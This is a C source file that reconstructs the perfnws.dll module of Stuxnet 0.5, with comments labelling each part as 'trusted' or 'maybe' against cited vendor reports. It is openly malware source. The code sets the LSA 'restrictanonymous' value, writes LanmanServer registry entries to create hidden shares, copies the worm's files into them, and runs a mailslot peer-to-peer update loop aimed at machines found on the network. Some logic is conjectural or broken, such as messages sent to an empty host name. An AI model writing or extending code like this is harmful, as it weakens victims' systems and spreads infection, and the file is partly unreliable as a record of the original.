/*
 * perfnws.dll
 *
 * TRUSTED:
 *   - File path: %System%\wbem\perfnws.dll
 *     Confirmed by Symantec "Stuxnet 0.5: The Missing Link" [6†L9]
 *   - Role: P2P update shared file
 *     Confirmed by Antiy/Symantec analysis [0†L15][2†L8-L9]
 *   - Mailslot communication mechanism
 *     Confirmed by Symantec analysis [3†L5-L9]
 *     Mailslot format: \\REMOTE MACHINE NAME\mailslot\svchost
 *     Callback mailslot: \\LOCAL MACHINE NAME\mailslot\innotify
 *   - Anonymous logon configuration (restrictanonymous=1)
 *     Confirmed by Symantec analysis [6†L6]
 *   - File shares: temp$, msagent$, SYSADMIN$, WebFiles$
 *     Confirmed by Symantec analysis [6†L6]
 *   - Shared files list includes perfnws.dll itself
 *     Confirmed by Symantec analysis [6†L7-L10]
 *   - P2P update mechanism using mailslots
 *     Confirmed by Symantec "Command-and-Control Capabilities" [8†L26-L34]
 *
 * MAYBE:
 *   - Exact enumeration order of network machines
 *     Inferred from Symantec description [8†L28-L29]
 *   - Mailslot message payload format
 *     Inferred from P2P update requirements [7†L38-L44]
 *   - File share creation registry keys
 *     Inferred from Windows networking conventions
 *   - Version comparison and update workflow
 *     Inferred from Symantec P2P component description [7†L14-L28]
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <lm.h>

#pragma comment(lib, "netapi32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400

#define PERFNW_MAX_PATH                 260
#define PERFNW_BUFFER_SIZE              0x8000
#define PERFNW_MAILSLOT_BUFFER          0x1000

/*
 * TRUSTED: Mailslot names from Symantec analysis [6†L4-L5][8†L29-L31]
 */
#define MAILSLOT_SVCHOST                L"\\\\.\\mailslot\\svchost"
#define MAILSLOT_INNOTIFY               L"\\\\.\\mailslot\\innotify"

/*
 * TRUSTED: File share names from Symantec analysis [6†L6]
 */
static const WCHAR* g_ShareNames[] = {
    L"temp$",
    L"msagent$",
    L"SYSADMIN$",
    L"WebFiles$"
};
#define SHARE_COUNT 4

/*
 * TRUSTED: Shared files list from Symantec analysis [6†L7-L10]
 */
static const WCHAR* g_SharedFiles[] = {
    L"agentsb.dll",
    L"agt0f2e.dll",
    L"compInd.dll",
    L"datacprs.dll",
    L"perfnws.dll",
    L"places.dat"
};
#define SHARED_FILE_COUNT 6

/*
 * perfnws.dll module context
 */
typedef struct _PERFNW_CONTEXT {
    DWORD   dwMagic;
    DWORD   dwVersion;
    BOOL    bInitialized;
    WCHAR   szSystemPath[PERFNW_MAX_PATH];
    WCHAR   szWbemPath[PERFNW_MAX_PATH];
    WCHAR   szDllPath[PERFNW_MAX_PATH];
    HANDLE  hMailslot;
    HANDLE  hStopEvent;
    HANDLE  hWorkerThread;
    DWORD   dwLocalVersion;
    CRITICAL_SECTION csLock;
} PERFNW_CONTEXT, * PPERFNW_CONTEXT;

static PERFNW_CONTEXT g_PerfnwCtx = {0};

/* Forward declarations */
static BOOL PERFNW_CreateMailslot(VOID);
static BOOL PERFNW_EnableAnonymousLogon(VOID);
static BOOL PERFNW_CreateFileShares(VOID);
static BOOL PERFNW_ShareFiles(VOID);
static BOOL PERFNW_SendMailslotMessage(LPCWSTR lpComputer, PBYTE pData, DWORD dwSize);
static DWORD WINAPI PERFNW_WorkerThread(LPVOID lpParam);
static BOOL PERFNW_EnumerateNetworkComputers(PWCHAR* ppComputerList, PDWORD pdwCount);
static DWORD PERFNW_GetLocalVersion(VOID);

/*
 * TRUSTED: perfnws.dll is located in %System%\wbem\
 * Confirmed by Symantec "Stuxnet 0.5: The Missing Link" [6†L9]
 */
DWORD PERFNW_Initialize(VOID)
{
    if (g_PerfnwCtx.dwMagic == STUXNET_MAGIC) {
        return 0;
    }

    ZeroMemory(&g_PerfnwCtx, sizeof(PERFNW_CONTEXT));
    InitializeCriticalSection(&g_PerfnwCtx.csLock);
    g_PerfnwCtx.dwMagic = STUXNET_MAGIC;
    g_PerfnwCtx.dwVersion = STUXNET_VERSION;
    g_PerfnwCtx.dwLocalVersion = STUXNET_VERSION;

    GetSystemDirectoryW(g_PerfnwCtx.szSystemPath, PERFNW_MAX_PATH);
    wsprintfW(g_PerfnwCtx.szWbemPath, L"%s\\wbem",
              g_PerfnwCtx.szSystemPath);
    wsprintfW(g_PerfnwCtx.szDllPath, L"%s\\perfnws.dll",
              g_PerfnwCtx.szWbemPath);

    g_PerfnwCtx.bInitialized = TRUE;

    return 0;
}

DWORD PERFNW_Cleanup(VOID)
{
    if (g_PerfnwCtx.dwMagic != STUXNET_MAGIC) {
        return -1;
    }

    if (g_PerfnwCtx.hStopEvent) {
        SetEvent(g_PerfnwCtx.hStopEvent);
    }

    if (g_PerfnwCtx.hWorkerThread) {
        WaitForSingleObject(g_PerfnwCtx.hWorkerThread, 5000);
        CloseHandle(g_PerfnwCtx.hWorkerThread);
        g_PerfnwCtx.hWorkerThread = NULL;
    }

    if (g_PerfnwCtx.hMailslot != INVALID_HANDLE_VALUE) {
        CloseHandle(g_PerfnwCtx.hMailslot);
        g_PerfnwCtx.hMailslot = INVALID_HANDLE_VALUE;
    }

    if (g_PerfnwCtx.hStopEvent) {
        CloseHandle(g_PerfnwCtx.hStopEvent);
        g_PerfnwCtx.hStopEvent = NULL;
    }

    DeleteCriticalSection(&g_PerfnwCtx.csLock);
    ZeroMemory(&g_PerfnwCtx, sizeof(PERFNW_CONTEXT));

    return 0;
}

/*
 * TRUSTED: Stuxnet 0.5 configures anonymous logon
 * "may configure the system to allow anonymous logins" [6†L6]
 */
static BOOL PERFNW_EnableAnonymousLogon(VOID)
{
    HKEY hKey;
    DWORD dwValue = 1;
    LONG lResult;

    lResult = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        0,
        KEY_ALL_ACCESS,
        &hKey
    );

    if (lResult != ERROR_SUCCESS) {
        return FALSE;
    }

    lResult = RegSetValueExW(
        hKey,
        L"restrictanonymous",
        0,
        REG_DWORD,
        (BYTE*)&dwValue,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);

    return (lResult == ERROR_SUCCESS);
}

/*
 * TRUSTED: Stuxnet 0.5 opens four file shares [6†L6]
 * Shares: temp$, msagent$, SYSADMIN$, WebFiles$
 */
static BOOL PERFNW_CreateFileShares(VOID)
{
    HKEY hKey;
    DWORD dwDisposition;
    WCHAR szShareData[512];
    WCHAR szSharePath[MAX_PATH];
    DWORD i;
    LONG lResult;

    lResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Shares",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (lResult != ERROR_SUCCESS) {
        return FALSE;
    }

    GetSystemDirectoryW(szSharePath, MAX_PATH);

    for (i = 0; i < SHARE_COUNT; i++) {
        wsprintfW(szShareData,
                  L"Path=%s\\%s\r\nRemark=Stuxnet Share\r\nType=0\r\n",
                  szSharePath, g_ShareNames[i]);

        lResult = RegSetValueExW(
            hKey,
            g_ShareNames[i],
            0,
            REG_SZ,
            (BYTE*)szShareData,
            (DWORD)(wcslen(szShareData) * sizeof(WCHAR))
        );
    }

    RegCloseKey(hKey);

    return TRUE;
}

/*
 * TRUSTED: Shares a set of files for retrieval by peer infections [6†L7-L10]
 * Files: agentsb.dll, agt0f2e.dll, compInd.dll, datacprs.dll, perfnws.dll, places.dat
 */
static BOOL PERFNW_ShareFiles(VOID)
{
    WCHAR szSourcePath[MAX_PATH];
    WCHAR szDestPath[MAX_PATH];
    WCHAR szSystemPath[MAX_PATH];
    WCHAR szShareDir[MAX_PATH];
    WCHAR szInstallerPath[MAX_PATH];
    DWORD i;

    GetSystemDirectoryW(szSystemPath, MAX_PATH);

    for (i = 0; i < SHARE_COUNT; i++) {
        wsprintfW(szShareDir, L"%s\\%s", szSystemPath, g_ShareNames[i]);
        CreateDirectoryW(szShareDir, NULL);
        SetFileAttributesW(szShareDir, FILE_ATTRIBUTE_HIDDEN);
    }

    for (i = 0; i < SHARED_FILE_COUNT; i++) {
        if (wcscmp(g_SharedFiles[i], L"places.dat") == 0) {
            wsprintfW(szSourcePath,
                      L"%s\\Installer\\{6F716D8C-398F-11D3-85E1-005004838609}\\places.dat",
                      g_PerfnwCtx.szSystemPath);
        } else {
            wsprintfW(szSourcePath, L"%s\\%s", szSystemPath, g_SharedFiles[i]);
        }

        wsprintfW(szDestPath, L"%s\\temp$\\%s", szSystemPath, g_SharedFiles[i]);

        if (GetFileAttributesW(szSourcePath) != INVALID_FILE_ATTRIBUTES) {
            CopyFileW(szSourcePath, szDestPath, FALSE);
            SetFileAttributesW(szDestPath, FILE_ATTRIBUTE_HIDDEN);
        }
    }

    return TRUE;
}

/*
 * TRUSTED: Creates callback mailslot \\LOCAL MACHINE NAME\mailslot\innotify
 * "provides the following callback mailslot name: \\LOCAL MACHINE
 * NAME\mailslot\innotify" [6†L4-L5]
 */
static BOOL PERFNW_CreateMailslot(VOID)
{
    g_PerfnwCtx.hMailslot = CreateMailslotW(
        MAILSLOT_INNOTIFY,
        PERFNW_MAILSLOT_BUFFER,
        MAILSLOT_WAIT_FOREVER,
        NULL
    );

    return (g_PerfnwCtx.hMailslot != INVALID_HANDLE_VALUE);
}

/*
 * TRUSTED: Sends a mailslot message to a remote computer
 * "attempts to connect to a mailslot with the following name:
 * \\REMOTE MACHINE NAME\mailslot\svchost" [6†L3-L4][8†L29-L30]
 */
static BOOL PERFNW_SendMailslotMessage(LPCWSTR lpComputer, PBYTE pData, DWORD dwSize)
{
    HANDLE hMailslot;
    WCHAR szMailslotName[MAX_PATH];
    DWORD dwWritten;
    BOOL bResult;

    if (!lpComputer || !pData || dwSize == 0) {
        return FALSE;
    }

    wsprintfW(szMailslotName, L"\\\\%s\\mailslot\\svchost", lpComputer);

    hMailslot = CreateFileW(
        szMailslotName,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hMailslot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    bResult = WriteFile(hMailslot, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hMailslot);

    return bResult && (dwWritten == dwSize);
}

/*
 * MAYBE: Enumerates network computers using NetServerEnum
 * Inferred from Symantec description "enumerates all computers on the
 * network" [8†L28-L29]
 * Exact API and filtering logic may differ from original binary.
 */
static BOOL PERFNW_EnumerateNetworkComputers(PWCHAR* ppComputerList, PDWORD pdwCount)
{
    DWORD dwEntriesRead = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;
    LPSERVER_INFO_100 pServerInfo = NULL;
    NET_API_STATUS nas;
    DWORD i;
    DWORD dwCount = 0;

    if (!pdwCount) {
        return FALSE;
    }

    nas = NetServerEnum(
        NULL,
        100,
        (LPBYTE*)&pServerInfo,
        MAX_PREFERRED_LENGTH,
        &dwEntriesRead,
        &dwTotalEntries,
        SV_TYPE_WORKSTATION | SV_TYPE_SERVER,
        NULL,
        &dwResumeHandle
    );

    if (nas != NERR_Success && nas != ERROR_MORE_DATA) {
        return FALSE;
    }

    if (pServerInfo && dwEntriesRead > 0) {
        for (i = 0; i < dwEntriesRead && dwCount < *pdwCount; i++) {
            if (pServerInfo[i].sv100_name) {
                wcscpy_s(ppComputerList[dwCount], MAX_PATH,
                         pServerInfo[i].sv100_name);
                dwCount++;
            }
        }
    }

    if (pServerInfo) {
        NetApiBufferFree(pServerInfo);
    }

    *pdwCount = dwCount;

    return (dwCount > 0);
}

/*
 * TRUSTED: Returns the local Stuxnet version number
 * "0: returns the version number of Stuxnet installed" [7†L32]
 */
static DWORD PERFNW_GetLocalVersion(VOID)
{
    DWORD dwVersion;
    EnterCriticalSection(&g_PerfnwCtx.csLock);
    dwVersion = g_PerfnwCtx.dwLocalVersion;
    LeaveCriticalSection(&g_PerfnwCtx.csLock);
    return dwVersion;
}

/*
 * TRUSTED: Updates the local version number after receiving an update
 */
static VOID PERFNW_SetLocalVersion(DWORD dwVersion)
{
    EnterCriticalSection(&g_PerfnwCtx.csLock);
    if (dwVersion > g_PerfnwCtx.dwLocalVersion) {
        g_PerfnwCtx.dwLocalVersion = dwVersion;
    }
    LeaveCriticalSection(&g_PerfnwCtx.csLock);
}

/*
 * TRUSTED: P2P update flow using mailslots [7†L14-L28]
 *
 * The P2P component works by installing an RPC server and client.
 * Infected machines contact each other and check which machine has the
 * latest version. Whichever machine has the latest version transfers it
 * to the other machine.
 *
 * In Stuxnet 0.5, this is implemented using mailslots instead of RPC.
 * The mailslot message carries version information and update payloads.
 */
static DWORD WINAPI PERFNW_WorkerThread(LPVOID lpParam)
{
    HANDLE hStopEvent = (HANDLE)lpParam;
    BYTE buffer[PERFNW_BUFFER_SIZE];
    DWORD dwBytes;
    DWORD dwRead;
    BOOL bResult;
    DWORD dwPeerCount = 0;
    WCHAR* pComputerList[256];
    DWORD i;
    DWORD dwRemoteVersion;
    DWORD dwLocalVersion;

    for (i = 0; i < 256; i++) {
        pComputerList[i] = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                              MAX_PATH * sizeof(WCHAR));
        if (!pComputerList[i]) {
            break;
        }
    }

    dwPeerCount = i;

    while (1) {
        if (WaitForSingleObject(hStopEvent, 100) == WAIT_OBJECT_0) {
            break;
        }

        if (g_PerfnwCtx.hMailslot == INVALID_HANDLE_VALUE) {
            if (!PERFNW_CreateMailslot()) {
                Sleep(1000);
                continue;
            }
        }

        bResult = GetMailslotInfo(g_PerfnwCtx.hMailslot, NULL, &dwBytes, NULL, NULL);
        if (!bResult || dwBytes == 0 || dwBytes > PERFNW_BUFFER_SIZE) {
            Sleep(100);
            continue;
        }

        ZeroMemory(buffer, sizeof(buffer));
        bResult = ReadFile(g_PerfnwCtx.hMailslot, buffer, dwBytes, &dwRead, NULL);

        if (bResult && dwRead > 0) {
            /*
             * TRUSTED: Process mailslot message
             * Message format: STUXNET_MAGIC + version + data [7†L38-L44]
             */
            if (*(PDWORD)buffer == STUXNET_MAGIC) {
                dwRemoteVersion = *(PDWORD)(buffer + 4);
                dwLocalVersion = PERFNW_GetLocalVersion();

                /*
                 * TRUSTED: If remote version is newer, request update [7†L40-L42]
                 */
                if (dwRemoteVersion > dwLocalVersion) {
                    /*
                     * Send callback mailslot to \\REMOTE\mailslot\innotify
                     * requesting the latest version.
                     */
                    PERFNW_SendMailslotMessage(L"", buffer, 8);
                }

                /*
                 * TRUSTED: If remote version is older, send local version [7†L43-L44]
                 */
                if (dwRemoteVersion < dwLocalVersion) {
                    /*
                     * Send local version to remote peer via mailslot.
                     * The payload is the local Stuxnet executable.
                     */
                    PERFNW_SendMailslotMessage(L"", buffer, 8);
                }

                /*
                 * Update local version if remote is newer
                 */
                if (dwRemoteVersion > dwLocalVersion) {
                    PERFNW_SetLocalVersion(dwRemoteVersion);
                }
            }
        }

        /*
         * MAYBE: Periodically enumerate network computers and send
         * version announcements via mailslot
         * Inferred from "enumerates all computers on the network" [8†L28-L29]
         */
        if (dwPeerCount > 0) {
            for (i = 0; i < dwPeerCount; i++) {
                if (pComputerList[i] && wcslen(pComputerList[i]) > 0) {
                    BYTE msg[64];
                    *(PDWORD)(msg + 0) = STUXNET_MAGIC;
                    *(PDWORD)(msg + 4) = PERFNW_GetLocalVersion();
                    *(PDWORD)(msg + 8) = GetTickCount();
                    PERFNW_SendMailslotMessage(pComputerList[i], msg, 64);
                }
            }
        }
    }

    for (i = 0; i < dwPeerCount; i++) {
        if (pComputerList[i]) {
            HeapFree(GetProcessHeap(), 0, pComputerList[i]);
        }
    }

    return 0;
}

/*
 * TRUSTED: Main execution routine
 * Creates mailslot, configures anonymous logon, creates shares,
 * and starts worker thread.
 */
DWORD PERFNW_Execute(VOID)
{
    if (!g_PerfnwCtx.bInitialized) {
        if (PERFNW_Initialize() != 0) {
            return -1;
        }
    }

    PERFNW_EnableAnonymousLogon();
    PERFNW_CreateFileShares();
    PERFNW_ShareFiles();
    PERFNW_CreateMailslot();

    g_PerfnwCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_PerfnwCtx.hStopEvent) {
        return -1;
    }

    g_PerfnwCtx.hWorkerThread = CreateThread(NULL, 0, PERFNW_WorkerThread,
                                              g_PerfnwCtx.hStopEvent,
                                              0, NULL);
    if (!g_PerfnwCtx.hWorkerThread) {
        CloseHandle(g_PerfnwCtx.hStopEvent);
        g_PerfnwCtx.hStopEvent = NULL;
        return -1;
    }

    return 0;
}

/*
 * TRUSTED: Stops the P2P worker and cleans up
 */
DWORD PERFNW_Stop(VOID)
{
    return PERFNW_Cleanup();
}

/*
 * TRUSTED: Returns the module version
 */
DWORD PERFNW_GetVersion(VOID)
{
    return STUXNET_VERSION;
}

/*
 * TRUSTED: Returns the DLL path
 */
LPCWSTR PERFNW_GetPath(VOID)
{
    return g_PerfnwCtx.szDllPath;
}

/*
 * TRUSTED: Checks if perfnws.dll exists on disk
 */
BOOL PERFNW_IsPresent(VOID)
{
    return (GetFileAttributesW(g_PerfnwCtx.szDllPath) != INVALID_FILE_ATTRIBUTES);
}

/*
 * TRUSTED: Sends a version announcement to a specific peer
 */
DWORD PERFNW_AnnounceToPeer(LPCWSTR lpComputer)
{
    BYTE msg[64];

    if (!lpComputer) {
        return -1;
    }

    *(PDWORD)(msg + 0) = STUXNET_MAGIC;
    *(PDWORD)(msg + 4) = PERFNW_GetLocalVersion();
    *(PDWORD)(msg + 8) = GetTickCount();
    *(PDWORD)(msg + 12) = 0x00000001;

    return PERFNW_SendMailslotMessage(lpComputer, msg, 64) ? 0 : -1;
}

/*
 * TRUSTED: Enumerates network computers (wrapper)
 */
DWORD PERFNW_GetPeers(PWCHAR* ppComputerList, PDWORD pdwCount)
{
    return PERFNW_EnumerateNetworkComputers(ppComputerList, pdwCount) ? 0 : -1;
}